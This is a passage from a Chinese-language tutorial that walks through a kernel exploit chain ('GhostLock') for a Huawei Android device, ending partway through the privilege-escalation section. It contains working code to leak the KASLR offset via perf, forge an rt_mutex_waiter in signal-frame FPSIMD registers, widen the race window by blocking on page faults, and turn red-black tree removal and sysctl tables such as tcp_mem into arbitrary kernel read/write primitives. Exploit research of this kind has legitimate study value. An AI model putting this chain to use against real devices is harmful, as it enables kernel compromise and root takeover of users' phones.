        struct rb_node *           rb_right;             /*     8     8 */
        struct rb_node *           rb_left;              /*    16     8 */

        /* size: 24, cachelines: 1, members: 3 */
        /* last cacheline: 24 bytes */
} __attribute__((__aligned__(8)));
```

这是一个红黑树节点，一个waiter对应一个节点。

在 `sched_setattr()` 中，waiter会被摘下来，修改优先级等信息，然后挂回树上。

所以我们手动构造一种情况：一棵树只有两个节点：根节点和唯一的孩子节点（左或者右孩子）。

如果要摘下根节点，孩子节点会被提升为新根，这就是一次 **指针写** ：

```cpp
rb_node *root = child; // 伪代码
```

因为child是伪造的，所以相当于往root写入任意指针。

注意，这只是官方写原语的最简做法，我们对其作了3种改进（对应本节的0号布局，以及后续的1号和2号），在后续章节会讲解。

#### 3.2.5.2 受限写为何受限

因为在sched_setattr()中，很多函数会用到root周围的结构。

比如给 `rt_mutex::wait_lock` 上锁时，如果锁结构不规范（比如之前的魔数），内核读取锁状态就会崩溃。

```cpp
struct rt_mutex {
        raw_spinlock_t             wait_lock;            /*     0     4 */

        /* XXX 4 bytes hole, try to pack */

        struct rb_root_cached      waiters;              /*     8    16 */
        struct task_struct *       owner;                /*    24     8 */

        /* size: 32, cachelines: 1, members: 3 */
        /* sum members: 28, holes: 1, sum holes: 4 */
        /* last cacheline: 32 bytes */
};

struct rb_root_cached {
        struct rb_root {
                struct rb_node *   rb_node;                                              /*     0     8 */
        }rb_root; /*     0     8 */
        struct rb_node *           rb_leftmost;                                          /*     8     8 */

        /* size: 16, cachelines: 1, members: 2 */
        /* last cacheline: 16 bytes */
};
```

同样的限制又多又严格。在DBY中，waiter的内容：

```cpp
// 对着下表看
struct rt_mutex_waiter {
        struct rb_node             tree_entry __attribute__((__aligned__(8))); /*     0    24 */
        struct rb_node             pi_tree_entry __attribute__((__aligned__(8))); /*    24    24 */
        struct task_struct *       task;                 /*    48     8 */
        struct rt_mutex *          lock;                 /*    56     8 */
        /* --- cacheline 1 boundary (64 bytes) --- */
        unsigned int               major_prio;           /*    64     4 */
        int                        major_only;           /*    68     4 */
        int                        prio;                 /*    72     4 */

        /* XXX 4 bytes hole, try to pack */

        u64                        deadline;             /*    80     8 */

        /* size: 88, cachelines: 2, members: 8 */
        /* sum members: 84, holes: 1, sum holes: 4 */
        /* forced alignments: 2 */
        /* last cacheline: 24 bytes */
};
```

这些内容可能填成：

| 成员名                         | 是否为指针 | 填              | 作用                                                         |
| ------------------------------ | ---------- | --------------- | ------------------------------------------------------------ |
| `tree_entry.__rb_parent_color` | 是         | VICTIM - 8 \| 1 | 填 1 是红色，红黑树删除红节点最简单，具体原理见3.2.6.2       |
| `tree_entry.rb_right`          | 是         | PAYLOAD         | 攻击者想要的任意地址值                                       |
| `tree_entry.rb_left`           | 是         | nullptr         | 只能有一个孩子                                               |
| `pi_tree_entry`                | 否         | `0`             | 省事                                                         |
| `task`                         | 是         | `&init_task`    | 末尾会 `wake_up_process(waiter->task)`；指向 0 号线程（state=0）直接 early-return，什么都不做 |
| `lock`                         | 是         | 全0             | 省事                                                         |
| `major_prio`/`major_only`      | 否         | `0`             | 省事                                                         |
| `prio`                         | 否         | `130`           | 给个合法 RT 优先级，避免走怪分支                             |
| `deadline`                     | 否         | `0`             | 省事                                                         |

这就是0号布局，你在代码的tools.cpp可以自行修改。

VICTIM是被写地址，PAYLOAD是被写值。比如我要往0x233写数据0x666，那么VICTIM = 0X233，PAYLOAD = 0x666。

后续章节会讲到，我们改进后的3节点受限写其实是两笔写，而第二笔写（寄生写）会改掉目标位置前8字节；再次改进甚至能获得按位无寄生写——但是我们用不到。

如果你想要升级到无寄生写的原语，github有个nova6的仓库可供参考：

[GitHub - Eknight-Eutopia/GhostLock-Huawei-HWWLZ: A simple ghostlock porting plan for huawei nova6 hwwlz (kirin 990, harmonyos 4.2, linux 5.10.43) · GitHub](https://github.com/Eknight-Eutopia/GhostLock-Huawei-HWWLZ)

### 3.2.6 受限读

#### 3.2.6.1 原理

`cat /proc/sys/kernel/random/boot_id` 是用户可读的，生成16字节数据。这个数据在源码中是：

```cpp
struct ctl_table {
        const char  *              procname;             /*     0     8 */
        void *                     data;//这个                 /*     8     8 */
        int                        maxlen;               /*    16     4 */
        umode_t                    mode;                 /*    20     2 */

        /* XXX 2 bytes hole, try to pack */

        struct ctl_table *         child;                /*    24     8 */
        proc_handler *             proc_handler;         /*    32     8 */
        struct ctl_table_poll *    poll;                 /*    40     8 */
        void *                     extra1;               /*    48     8 */
        void *                     extra2;               /*    56     8 */

        /* size: 64, cachelines: 1, members: 9 */
        /* sum members: 62, holes: 1, sum holes: 2 */
};
```

同文件2106行给出初始化值：

```cpp
	{
		.procname	= "boot_id",
		.data		= &sysctl_bootid,   
		.maxlen		= 16,
		.mode		= 0444,
		.proc_handler	= proc_do_uuid,
	},
```

.data指向 `static char sysctl_bootid[16]` (`drivers/char/random.c ` 2018行)；

所以如果把.data改成自定义位置，就是读原语。

当然，这只是最低级的读原语，3.3.3能改造成无限长（只要不缺页、内存够用）。

#### 3.2.6.2 受限读为何受限

这涉及红黑树原理：删除节点，至少需要更新他的`父节点的孩子`和`子节点的父亲`，回忆节点布局：

```cpp
struct rb_node {
        long unsigned int          __rb_parent_color;    /*     0     8 */
        struct rb_node *           rb_right;             /*     8     8 */
        struct rb_node *           rb_left;              /*    16     8 */

        /* size: 24, cachelines: 1, members: 3 */
        /* last cacheline: 24 bytes */
} __attribute__((__aligned__(8)));
```

__rb_parent_color 存储的是parent和color。newchild换了父节点，这个字段**必须更新**。于是写原语出现了最麻烦的限制：

```text
假设当前节点是rb_node* node，颜色为红，node->rb_right = PAYLOAD，node.rb_left = NULL；
假设node的父节点是rb_node* parent，parent = VICTIM - 8，则&(parent->rb_right) = VICTIM
现在触发rb_erase(node)，函数内有两个写动作（1表示颜色为红）：
1. *(u64*)VICTIM = PAYLOAD
2. *(u64*)PAYLOAD = node->__rb_parent_color = (VICTIM - 8) | 1
```

这个限制就是第2条：本来我们让 `*(u64*).data = PAYLOAD`，可以读到*PAYLOAD；但是**第2条把`*PAYLOAD`前8字节改了**，这就是之前说的寄生写。bootid共16字节，所以现在只有后8字节没被改（同样如前所述，后续章节讲的1号和2号、可变长有界读能减少一些限制）。

也就是说，受限读的限制是 **读起点往前8字节必须可写且写了之后无害**。

另一方面，考虑受限写的目标，也是个大麻烦：我们通常喜欢修改一些内核中的函数指针，让他指向自定义函数，这样就能随便读写毫无副作用。但函数指针解引用是代码段，一般不可写（虽然可以用汇编绕过，但太麻烦我们不用）。

好消息：第二笔写并非全是坏处：

如果把受限写目标改成&system_bootid数组，因为数组里面是随机数，所以我们随便写，内核无法也不会分辨数组里是不是被改过。

利用这一点，完成第二笔写后在shell `cat /proc/sys/kernel/random/boot_id`，去掉连字符并转成大端，前8字节如果 = (VICTIM - 8) | 1，就说明写原语成功了。

这就是 **读写原语自校验** ，以最简单的方式同时验证读写原语，即代码中的`selfCheck()`函数。

实际上，这只是提供一个自校验思路，我们在3.3.2会讲解一个更长的读原语。

### 3.2.7 获得精确内存地址

#### 3.2.7.1 获取真机内核

到此为止，我们已经注意到，要想伪造一个合法的waiter，内存布局 **必须完全精确** 。

**关键问题：如何完全精确地铺设攻击者数据？**

```text
	我们能在靶场进行无数次实验（只要有耐心），使用gdb等调试工具观看内存dump。所以在靶场，写原语最终可调节到精准的位置。
	但真机呢？编译器版本不完全一致、厂商只公开大版本的早期源码。所以内核在数次补丁后，偏移多半不再和靶场一致。这时我们要想办法提取出真机的boot.img。
```

**关键问题：如何提取真机boot.img？**

```text
	最常见的方法是从原厂固件包提取。即便是冷门的设备，只要有OTA就有机会抓到包。至于没有OTA的情况，我想这种机器可能连内核源码都不公开，所以不在本文讨论范围内（你也可以拆机读闪存芯片，并且善良地公开到GitHub，让后来者不必折腾至此）。
```

以DBY为例，华为固件可以通过Hisuite Proxy从华为服务器获取。

你很可能会发现，抓到的固件不完全对应真机的小版本。一般情况下，如此小的版本间偏移变化的概率很低，所以问题不大。

不过对于华为设备，我们可以顺便用proxy给真机**刷这个小版本的包**，对真机而言仅是一次“全量包式OTA”，甚至可以利用Hisuite 模拟OTA的特性，在小版本间保数据降级。

华为下包网站：

https://ffusersubmission.byethost17.com/
https://professorjtj.github.io/v2/

酷安有许多proxy使用教程，请读者自行搜索。

#### 3.2.7.2 泄露KASLR偏移

仅仅是搞到链接期地址远远不够，内核开机后有KASLR，地址随机漂移几十GB，防的就是我们这套提取boot.img的方案。

但是Linux实在是不够安全，有一种极其简单的办法可以算出漂移（slide），我们称之为 **perf泄露**。

这个perf本来是Linux提供的性能测试工具，所以会泄露内核指针。如果我们发起大规模系统调用，就能产生大量内核指针，然后收集起来，算一下指针最密集的位置。

因为KASLR漂移是2MiB为单位，大多数内核指针会落入同一个2MiB的区间（qemu实测90%，真机可达99%），所以如果统计结果是：

```text
90%以上内核指针落在地址最低的2MiB区间
```

那这个区间左端点附近很可能（真机实际会有99%，所以无需怀疑）是 **_text段运行时地址**。误差不超过2MB，从boot.img获得链接期_text后就能获得在2MB内的偏移。

我们首选的事件是：

```cpp
int perf_open_strategy() {
    perf_event_attr a{};
    a.size = sizeof(perf_event_attr);
    a.type = PERF_TYPE_HARDWARE;//硬件事件
    a.config = PERF_COUNT_HW_CPU_CYCLES;//硬件事件下的时钟周期
    a.sample_period = 50000;//50000周期采样一次
    // 采样点排除用户代码
    a.exclude_user = 1;
    a.exclude_callchain_user = 1;
    a.exclude_hv = 1;//排除虚拟机陷入事件
    a.disabled = 1;//建立事件后，手动开始采集
    //影响环形缓冲区内，单位数据payload布局
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    a.sample_max_stack = 8;//最大只采8层调用链
    int fd = (int)syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) {
        print("perf事件PERF_COUNT_HW_CPU_CYCLES无法建立: ",strerror(errno));
        exit(1);
    }
    return fd;
    //已删除两种备选事件
}
```

DBY实测有权限，如果你的机型没有可以自己试试别的。

具体代码较长。perf设计得不好，我们需要手搓很多东西（这部分直接交给AI）。代码在`leak_slide()`。

#### 3.2.7.3 获取链接期地址

靶场用编译好的vmlinux，真机从boot.img逆向vmlinux，DBY的boot.img逆向出来符号齐全。

如果你的机器不齐全，让AI帮你反汇编。

主要代码在`GhostLock/const.h`和其他文件夹的const.h，init_addr.cpp。几个关键符号：

LINK_TEXT：`_text`链接期地址

LINK_INIT_TASK：`init_task` (一个内核填好的task_struct) 链接期地址

LINK_LOCK_START：伪`struct rt_mutex`的起始地址。sizeof(rt_mutex) = 0x20，每次消费需要一个0x20的全0空间，我们形象地称之为“烧槽”。

LINK_SLOT_SIZE：槽大小。槽位于内核地址空间的bss区。选这个区是因为这里有全0填充缝隙，内核不管这里可以随便写，而伪rt_mutex恰好需要填成全0。

```cpp
0xffffff800c3b5000   selinux_state          ← 最后一个真实符号
        ...
0xffffff800c3b5800   link_target（16 个伪 rt_mutex 槽）
        ···              slot0 … slot15        每个 0x20
0xffffff800c3b5a00   槽结束
    	···
0xffffff800c3b6000   __bss_stop（紧后面是 idmap_pg_dir，绝对不碰）
```

LINK_SLOT_MAX：槽号，我这里取62，注意从0号开始，所以一共是63个槽

LINK_CTL_TABLE_DATA：受限读原语提到过的ctl_table结构体的data字段

LINK_SYSCTL_BOOTID：上述data字段指向的sysctl_bootid数组

LINK_DATA_START：内核`_sdata`开头

LINK_BSS_START / LINK_BSS_STOP：内核`__bss_start` 和 `__bss_stop` 

LINK_TEXTOFF：perf泄露提到的2MB内偏移，等于LINK_TEXT取模0x200000

MIN_SLIDE / MAX_SLIDE：AI算出来是64-192GB

PERF_MAXP：最多采样多少内核指针，1'000'000足够

其他常量：根据注释在靶场就能量出。如果怕真机不一样（比如waiter在FPSIMD内的偏移），再让AI反汇编boot.img。

### 3.2.8 拉长消费窗口

这是技术含量非常高的一章。

#### 3.2.8.1 和官方不同在哪

参考资料中有两篇官方文章：x86和安卓版。他们分别使用prctl_set_mm_map和sendmsg，延长waiter盖在内核栈上，返回用户态前的时间。

但是DBY试过好多系统调用，只有信号帧完整盖住了waiter（之前提过了）。我的deepseek经过研究发现，一种较为简单的方法是：

1. 给信号处理函数设置备用栈，并指定备用栈是**文件映射**。
2. 在完整铺好waiter，后续函数读栈前，把被读的页**取消内存映射**（物理内存到线程虚拟地址空间的映射）。
3. 内核读这一页发现缺页，于是读文件、重新建立内存映射。
4. 磁盘IO非常慢，足够消费线程完成写原语。

#### 3.2.8.2 建阻塞文件

直接读源码是最简单的。上面有4步，我们慢慢来。

第一步之前，先讲文件怎么建：

```cpp
void setup_store() {
    store_fd = open(STORE_PATH, O_RDWR | O_CREAT | O_TRUNC, 0666);
    if (store_fd < 0) {
        print("阻塞文件建立失败：",strerror(errno));
        exit(1);
    }
    if (ftruncate(store_fd, STORE_FILE_SIZE) != 0) {
        print("ftruncate失败: ",strerror(errno));
        exit(1);
    }
    auto buf = std::make_shared<char[]>(STORE_FILE_SIZE);//自动执行0初始化
    auto n = pwrite(store_fd, buf.get(), STORE_FILE_SIZE, 0);
    if (n != STORE_FILE_SIZE) {
        print("阻塞文件没写满或者出错了 ",strerror(errno));
        exit(1);
    }
    if (fsync(store_fd) != 0) {
        print("fsync失败 ",strerror(errno));
        exit(1);
    }
}
```

一定要用fsync()，不然可能没写进磁盘。

#### 3.2.8.3 校准信号栈偏移

```cpp
void setup_altstack() {
    if (getenv("PAD")) {
        STORE_PATH = "/data/local/tmp/erblk";
        system("mkdir -p /data/local/tmp");
    }
    setup_store(); //建阻塞源
    void *A = mmap(nullptr, MAP_FILE_LEN, PROT_READ | PROT_WRITE, MAP_PRIVATE, store_fd, 0);
    if (A == MAP_FAILED) {
        print("文件映射建立失败");
        exit(1);
    }
    long size = SS_SIZE;
    for (int i = 0; i < 10; i++) {
        stack_t ss{}; ss.ss_sp = A; ss.ss_size = size; ss.ss_flags = 0;
        if (sigaltstack(&ss, nullptr) != 0) {
            print("sigaltstack失败：",strerror(errno));
            exit(1);
        }
        check_mode = true;
        syscall(SYS_tgkill, getpid(), my_tid(), SIGUSR1);
        while (sigframe == 0) { //注意信号handler是异步的
            asm("yield");
        }
        check_mode = false;
        unsigned int pgoff = sigframe & 0xFFFUL;
        if (pgoff != WANT_PGOFF) {
            long d = (long)pgoff - (long)WANT_PGOFF;
            if (d >  0x800) d -= 0x1000;
            if (d < -0x800) d += 0x1000;
            size -= d;
            if (size+0x1000 < SS_SIZE || size > SS_SIZE+0x1000) {
                print("ss_size 越界，放弃");
                exit(1);
            }
        }
        else return;
    }
    print("ss_size重试次数超限");
    exit(1);
}
```

建立文件映射只是一次mmap系统调用，很简单。重点是这个`ss_size` (备用栈大小) 的调整算法，他是什么原理？

首先看信号栈布局：

```text
-------------------- sp_top = ss_sp + ss_size
frame_record(0x10)
-------------------- frame_start = sp = sp_top - sizeof(frame_record)
sigframe(0x1250)
-------------------- frame_end = sp - sizeof(sigframe)
```

方才的代码中在比较：pgoff == WANT_PGOFF。这个pgoff = sigframe & 0xFFFUL (sigframe = 上图的frame_start) 是这样来的：

```text
frame_start = sp_top - sizeof(frame_record)
= ss_sp + ss_size - 0x10
```

其中ss_sp = 文件映射，系统调用约定4KB对齐，于是：

```text
frame_start & 0xFFFUL
= (ss_sp + ss_size - 0x10) & 0xFFFUL
= (ss_size - 0x10) & 0xFFFUL
```

因此调整ss_size就能使pgoff == WANT_PGOFF。

那为什么要得到这个WANT_PGOFF呢？我们看**期望的**信号帧 (sigframe) 布局，注意地址方向倒过来了：

```text
+0x00 frame_start                      |
···                                    |  低页
+0xA0 ----------4KB页边界-------------------------
···                                    |
+0x250 fpsimd数组，伪waiter所在地       |  高页
···                                    |
+0x1250 frame_end                      |
```

注意4KB页边界的位置。为什么期望是这个布局？

还记得本章开头说的吗？

```text
在完整铺好waiter，后续函数读栈前，把被读的页取消内存映射。
```

这里”被读的页“指上图的 **低页**。信号处理函数返回后会发生：

```text
信号handler返回后：
svc rt_sigreturn 
     ├─ restore_sigframe：512B fpsimd 拷贝落地（高页）   ← 铺伪 waiter 
     └─ restore_altstack：读 uc_stack（低页）→ 文件缺页 → W 睡 D 态   ← 窗口
```

刚才那句话的”后续函数“正是`restore_altstack`。重点是不能把高页打了，高页要拿来铺伪waiter。

有人会注意到，重新读文件到栈，文件里面全是0不会有影响吗？答案是我不知道但实测无影响。其实我们之前fpsimd乱改都没事，这个问题也不大。

总之，关键问题已经出现：要让4KB页边界准确落到 `frame_start + 0xA0` ，就要调整 `ss_size` 。

那WANT_PGOFF & 0xFFFUL = 0xF60U是怎么算出来的？其实超级简单：

```text
0x1000 - 0xA0 = 0XF60
```

而我们要做的仅仅是预设一个大约合适的备用栈大小：64KB，剩下的交给程序校准即可。

这时你可能注意到：为什么要循环10次？其实也只是防止代码出bug的兜底，一次就能算出正确ss_size了。

#### 3.2.8.4 打掉内存映射原理

之前所谓的打掉低页映射，其实有个大问题：我还在用栈，不会把自己打掉了吗？答案是当然会。

所以我们才需要信号处理函数自定义栈。这功能内核不提供，所以我们汇编手搓：

```asm
unsigned char mystack[0x10000] __attribute__((aligned(16)));
unsigned long handler_stack = (unsigned long)mystack + sizeof(mystack);
asm(
    R"(
        .text
        .global l11_tramp
    l11_tramp:
        mov x19, sp
        ldr x9, =handler_stack
        ldr x9, [x9]
        mov sp, x9
        bl  l11_body
        mov sp, x19
        mov x8, #139
        svc #0
        brk #0
    )"//brk不该走到，用于调试
);
```

语义还是很清晰的：

1. 把sp保存到x19，然后切换到自定义栈运行l11_body()来铺waiter和打掉低页；
2. 从x19恢复sp，触发rt_sigreturn()系统调用（系统调用号139）

我们看一下l11_body()的实现。

这里有一堆常量偏移，需要自己（推荐AI）在靶场和反汇编测量，偏移含义在定义处有注释，这里不再解释。

```cpp
// sig_handler.cpp
extern "C" void l11_body(void*, void*, void *ucp) {
    ···
    //铺伪waiter
    unsigned long *v = find_vregs((char*)ucp);
    std::fill_n(v, 512 / 8, 0xBAB1D011BAB1D011);//其余字节填魔数
    memcpy(v + WAITER_IDX, WAITER.data(), WAITER.size()*8);
    // 丢整个文件缓存
    auto fa = posix_fadvise(store_fd, 0x1000, 0x1000, POSIX_FADV_DONTNEED);
    ···
    // 用 MAP_FIXED 换掉低页映射
    auto low = sigframe & ~0xFFFUL;
    void *r = mmap((void *)low, 0x1000, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_FIXED, store_fd, 0x1000);
    ···
    w_done = 1;
    //这之后不能打印
}
```

大致流程：

1. 找到vregs数组：暴力扫描FPSIMD魔数，然后返回vregs地址：

   ```cpp
   unsigned long *find_vregs(char *ucp) {
       for (int i = 0; i <= 0x800; i += 4) {
           unsigned int magic = 0;
           memcpy(&magic, ucp + i, 4);
           if (magic != FPSIMD_MAGIC) continue;
           return (unsigned long *)(ucp + i + VREGS_OFF);
       }
       pstr("[handler] 没找到fpsimd魔数\n");
       _exit(1);
   }
   ```

2. 铺伪waiter、fadvice丢整个文件缓存、MAP_FIXED换掉低页映射：下次访问低页，缓存没命中，映射不在物理内存，系统只能走我们设置的文件映射，把文件内容读到低页。文件在setup_sig()被填0，所以低页清零。

然后有个小问题：fadvice在qemu只是guest发出的，host需要真的完成这个动作。所以host在此之前需要 **持续fadvice**：

```cpp
// 参考资料中的fadv.cpp
···
    while(1) {
        int fd = open(PATH, O_RDONLY);
        if (fd < 0) {
            if (errno != ENOENT) {
                std::perror("open出错=");
                return 1;
            }
            usleep(200);  // guest 尚未建好文件
            continue;
        }
        int rc = posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
        close(fd);
        if (rc != 0) {
            errno = rc;
            std::perror("posix_fadvise出错=");
            return 1;
        }
    }
···

```

回到`l11_body()`。注意尾部设置了w_done = 1，这是全局的原子变量，拿给消费线程读取：

```cpp
// GhostLock/main.cpp
int delay_us = 50;
    if (auto p = getenv("DELTA")) {
        delay_us = std::atoi(p);//单位是微秒
        print("用户给定DELTA=",delay_us);
    }
    else print("没给DELTA，默认50微秒");

    while (!w_done) {
        asm volatile("yield");
    }
    if (delay_us > 0) {
        auto until = rdcnt() + delay_us * (frq / 1000'000UL);
        while (rdcnt() < until) {
            asm volatile("yield");
        }
    }

    long sr = sched_setattr_batch(w_tid);
    w_consumed = 1;
    if (sr < 0) {
        print("消费失败");
        return -1;
    }
```

刚才这张图：

```text
信号handler返回后：
svc rt_sigreturn 
     ├─ restore_sigframe：512B fpsimd 拷贝落地（高页）   ← 铺伪 waiter 
     └─ restore_altstack：读 uc_stack（低页）→ 文件缺页 → W 睡 D 态   ← 窗口
```

说明铺waiter发生在 `restore_sigframe` ，所以DELTA就是w_done = 1到拷贝落地这段时间。

具体实测DELTA，真机=20，qemu=5000能保证100%落进消费窗口。

对于qemu，我们需要额外模拟一块慢速块设备，任何读写都延迟50ms：

我们用的是 **dm-delay** ，配置极其简单：

```sh
dd if=/dev/zero of=slow_disk.img bs=1M count=256
sudo losetup -f slow_disk.img
sudo dmsetup create slow_dev --table "0 262144 delay /dev/loop0 0 50"
sudo mkfs.ext4 /dev/mapper/slow_dev
sudo mount /dev/mapper/slow_dev delay_share/
```

让靶场开机挂载慢速磁盘：

```sh
# initramfs/init
···
# 末尾加一行，或者开机后手动挂载：
mount -t 9p -o trans=virtio,version=9p2000.L,msize=1048576 host1 /mnt1
```

阻塞文件改到慢速磁盘：

```cpp
// const.h
inline const char* STORE_PATH = "/mnt1/erblk";
```

这些操作后，如果还是达不到100%命中窗口，可能的原因是什么呢？

1. DELTA失效：DELTA精确到微秒，从w_done到计数再到消费的路径上，所有操作都应精简。比如说读环境变量要在读w_done之前：

```cpp
// GhostLock/main.cpp
//读这个环境变量一定要在w_done前，不然窗口会变长，DELTA无效
    int delay_us = 50;
    if (auto p = getenv("DELTA")) {
        delay_us = std::atoi(p);//单位是微秒
        print("用户给定DELTA=",delay_us);
    }
    else print("没给DELTA，默认50微秒");

    while (!w_done) {
        asm volatile("yield");
    }
    if (delay_us > 0) {
        auto until = rdcnt() + delay_us * (frq / 1000'000UL);
        while (rdcnt() < until) {
            asm volatile("yield");
        }
    }

    long sr = sched_setattr_batch(w_tid);
```

又比如，设置w_done后不要打印东西，直接返回：

```cpp
// GhostLock/sig_handler.cpp
extern "C" void l11_body(void*, void*, void *ucp) {
    ···
    pstr("[handler] 成功建立缺页阻塞\n");
    w_done = 1;
    //这之后不能打印
}
```

2. 如上所述，中途如果打印东西，那就是系统调用。如果是信号handler内设置w_done后打印，很可能会改变栈指针，导致waiter铺到别处。

## 3.3 提权到root

### 3.3.1 封装读写原语

为了一次运行能发多个读写原语，我把项目的读写原语做成一个类：

```cpp
#pragma once
#include <condition_variable>
#include <mutex>
#include <thread>
#include <vector>
//读写原语类
class Prim {
public:
    static Prim& getInstance() {
        static Prim instance;
        return instance;
    }
    Prim(const Prim&) = delete;
    Prim& operator=(const Prim&) = delete;
    Prim(Prim&&) = delete;
    Prim& operator=(Prim&&) = delete;
    //读写原语
    //调用者需确保 *addr 前8(layout=0)/8-16字节(layout=1)可写，否则崩溃
    void read_link(unsigned long addr, std::vector<unsigned long> &data, unsigned long n, int layout);
    //调用者需确保 *val 前8(layout=0)/8-16字节(layout=1)可写，否则崩溃
    void write_link(unsigned long addr, unsigned long val, int layout);
private:
    //触发死锁和消费的3线程
    void waiter();
    void owner();
    void consumer();
    long w_tid = 0;
    std::thread w, o;
    int f_wait = 0, f_chain = 0, f_target = 0;//PI futex
    std::atomic<bool> w_owns_chain{}, o_owns_target{};

    std::mutex rw_mtx{};//读写原语必须是原子操作
    int delay_us = 0; // 涂完栈等多久消费
    unsigned long addr_last_read = 0, layout_last_read = -1; //上次读的地址和布局
    void check_addr(int layout);

    //涂栈和析构通知
    std::condition_variable cv{};
    bool place_stack{}, cleanup{};
    std::mutex cv_mtx{};
    //无锁写原语，给read_p用
    void write_link_no_lock(unsigned long addr, unsigned long val, int layout);
    //用户态接口的原始内存转储，n单位是8字节
    std::vector<unsigned long> get_api(unsigned long n);

    Prim();
    ~Prim();
    //系统调用
    long lock_pi(int *uaddr);
    long unlock_pi(int *uaddr);
    long wait_requeue_pi(int *uaddr, int *uaddr2);
    long cmp_requeue_pi(int *uaddr, int *uaddr2, int cmpval);
    long sched_setattr_batch(long tid);
};

```

不用去纠结C++的线程代码语法，那不是利用链重点。我们只需要放心调用read_link()和write_link()，并且知道调用他们是并发安全的就行。

如果需要读/写指定地址，请参阅`环境变量.md`。

注意这处系统调用：

```cpp
long Prim::sched_setattr_batch(long tid) {
    // 每发必须真的改点东西：__sched_setscheduler() 在
    // policy == p->policy && nice 未变 时会直接 return 0，
    // 根本走不到 rt_mutex_adjust_pi(p)，这一发就白消费了。
    sched_attr a{}; a.size = sizeof(a);
    a.sched_policy = (SLOT & 1) ? SCHED_OTHER : SCHED_BATCH;
    a.sched_nice = 19;
    return syscall(SYS_sched_setattr, tid, &a, 0);
}
```

之前程序只支持写一发，但是现在运行一次可能写多发，就需要每轮换policy，保证真正进行了消费。

### 3.3.2 改进读原语

之前的读原语只支持16字节，完全不够。于是我让deepseek找了一个近乎无限长的读原语。

当然，并非真的无限，未映射的页不能读。所以应称之为 **可变长有界读**。

#### 3.3.2.1 读取长度本来固定

首先，我们这版读原语没有再用bootid。bootid太常见了，其他程序可能要用，所以换了一个冷门的用户态接口：

```sh
$ cat /proc/sys/net/ipv4/tcp_mem
21360   28482   42720
```

这个接口的数据来源依旧是：

```cpp
struct ctl_table {              
    const char *procname;       // +0    "tcp_mem"
    void       *data;           // +8    ← 数据来源=3个元素的unsigned long数组
    int         maxlen;         // +16   ← 数组有多少字节，默认24
    umode_t     mode;           
    struct ctl_table *child;    
    proc_handler *proc_handler; 
    ...
};
```

正常情况下，最多只返回给用户maxlen = 3个8字节数据，相邻数据用\t隔开，末尾输出\n。

所以要是能把maxlen改成无限大，那就随便读多少字节。

不过我们的写原语只能写8字节，还必须保证*PAYLOAD前8字节可写。maxlen是int，有符号位，但是PAYLOAD是内核指针，伪造一个符号位并要求 *PAYLOAD可写有点难。

#### 3.3.2.2 简化方案

于是看源码：

```cpp
// 源码关键逻辑
left  = *lenp;                  // 用户read()第三个参数给的 count
vleft = table->maxlen / 8;      // 表项声称能装几个 u64

for (i = data; left && vleft--; i++) {
    // 取一个 u64 → 转十进制 → 拼进用户缓冲
    proc_put_long(&buffer, &left, *i);   // left 减去实际写出的字节数
}
```

注意循环退出条件：`left && vleft--` 。只要两者都**不为0**，条件永远成立。

所以很简单：把vleft改成负数。也就是说**把maxlen写成负数**（注意≤-8不然`table->maxlen / 8 = 0`）。

这里我用`PAYLOAD = LINK_LOCK + (LINK_SLOT_MAX+1)*LINK_SLOT_SIZE ` ，落在maxlen的是PAYLOAD高4字节（因为是小端）`0xffffff9x`之类（内核指针是6个f开头）必是负数；

`VICTIM = &maxlen - 4`，防止写坏mode。

PAYLOAD指向所有LOCK槽预算的末尾，这部分仍然在bss零区，所以*PAYLOAD前8字节可写。

写完这一笔，再让PAYLOAD = 要读的地址，写进data。这样一来：

```cpp
// prim.cpp
auto buf = new char[n*21+1];//留一个写'\0'
auto fd = open(path, O_RDONLY);
···
unsigned long i;
for (i = 0; i < n*21; ) {
    auto r = read(fd, buf+i, n*21);
    if (r < 0) {
        if (errno == EINTR) continue;
        print("读取失败=", strerror(errno));
        exit(1);
    }
    if (r == 0) {
        buf[i] = '\0';
        break;
    }
    i += r;
}
```

n完全受我们控制，随便读多少都行，只要别读到未映射。

### 3.3.3 改进写原语

我们需要的是`*(u64*)VICTIM = PAYLOAD`，所谓寄生写，就是写原语副作用的那笔写：

之前（waiter布局0）的副作用是`*(u64*)PAYLOAD = VICTIM - 8 | 1`，这个副作用有点大。

于是deepseek找到了一个新的写法，让寄生写落在`*(u64*)(PAYLOAD+8) = VICTIM`。下面讲原理：

#### 3.3.3.1 waiter布局1

```cpp
// tools.cpp
void update_waiter_layout() {
    waiter_layout[0] = {
        VICTIM - 8 | 1,        // tree_entry.__rb_parent_color
        PAYLOAD,   // rb_right
        0,         // rb_left = 0 
        0, 0, 0,   // pi_tree_entry（未用）
        INIT_TASK, // task（init_task，state=0 ⇒ wake_up_process 早退）
        LOCK,      // lock → 伪 rt_mutex
        0,         // major_prio / major_only
        130,       // prio
        0          // deadline
    };
    waiter_layout[1] = {
        PAYLOAD,
        0,
        VICTIM,
        0, 0, 0,
        INIT_TASK,
        LOCK,
        0, 130, 0
    };
}
```

waiter_layout[1]相比0，只改了前三个字段。

每次调用原语时，布局参数layout由调用者指定：

```cpp
// prim.h
···
//调用者需确保 *addr 前8(layout=0)/8-16字节(layout=1)可写，否则崩溃
    void read_link(unsigned long addr, std::vector<unsigned long> &data, int n, int layout);
    //调用者需确保 *val 前8(layout=0)/8-16字节(layout=1)可写，否则崩溃
    void write_link(unsigned long addr, unsigned long val, int layout);
···
```

函数内部完成真正的读写操作，极大地方便一次运行多次读写。

复习一下：三个字段是当前waiter在树中的节点tree_entry：

```cpp
struct rt_mutex_waiter {
        struct rb_node             tree_entry __attribute__((__aligned__(8))); /*     0    24 */
···
}
```

rb_node的布局是：

```cpp
struct rb_node {
        long unsigned int          __rb_parent_color;    /*     0     8 */
        struct rb_node *           rb_right;             /*     8     8 */
        struct rb_node *           rb_left;              /*    16     8 */

        /* size: 24, cachelines: 1, members: 3 */
        /* last cacheline: 24 bytes */
} __attribute__((__aligned__(8)));
```

也就是说：

```text
rb_parent_color = PAYLOAD
rb_right = 0
rb_left = VICTIM
注意，PAYLOAD是4字节对齐，即黑色
```

之前说消费线程调用sche_setattr()时，内核会把waiter从红黑树上摘下来一次。

而上述的布局在内核视角下是：

```text
        幻影父节点PAYLOAD
            	|
        waiter所在节点node <- 摘这个
        /				\
